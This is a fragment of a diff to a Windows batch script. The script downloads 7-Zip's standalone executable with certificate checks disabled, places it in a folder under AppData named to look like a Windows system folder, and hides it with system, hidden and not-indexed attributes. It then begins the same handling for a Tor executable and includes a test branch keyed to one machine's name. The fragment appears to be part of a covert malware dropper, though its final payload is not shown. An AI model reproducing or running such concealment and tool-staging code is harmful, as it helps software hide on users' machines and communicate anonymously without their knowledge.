@@ -9,10 +9,10 @@ rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
 
-attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
-      attrib +s +h +i "%environment%\7-Zip"
+attrib -s -h -i "%environment%\7z.exe" && if exist "%environment%\7z.exe" (
+      attrib +s +h +i "%environment%\7z.exe"
 ) else (
-  "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
+  "%environment%\curl.exe" -k https://www.7-zip.org/a/7zr.exe -o "%environment%\7z.exe" && attrib +s +h +i "%environment%\7z.exe"
 )
 
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
